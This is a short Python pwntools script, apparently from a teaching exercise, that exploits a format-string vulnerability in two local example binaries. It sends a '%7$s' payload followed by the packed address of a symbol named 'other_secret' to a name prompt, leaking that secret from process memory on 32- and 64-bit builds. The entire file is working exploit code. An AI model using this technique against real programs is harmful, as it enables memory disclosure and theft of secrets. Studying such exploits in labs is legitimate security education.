#!/usr/bin/env python3
from pwn import *

context.log_level = "error"


def print_other_string(prog_name, fmt, p_fun):
    p = process(prog_name)
    p.sendlineafter(b"name", fmt + p_fun(ELF(prog_name).sym.other_secret))
    output = p.clean(1)
    p.close()
    print(f"{prog_name=} {output=}")


print_other_string("./example-32", b"%7$s", p32)
print_other_string("./example-64", b"%7$sGGGG", p64)
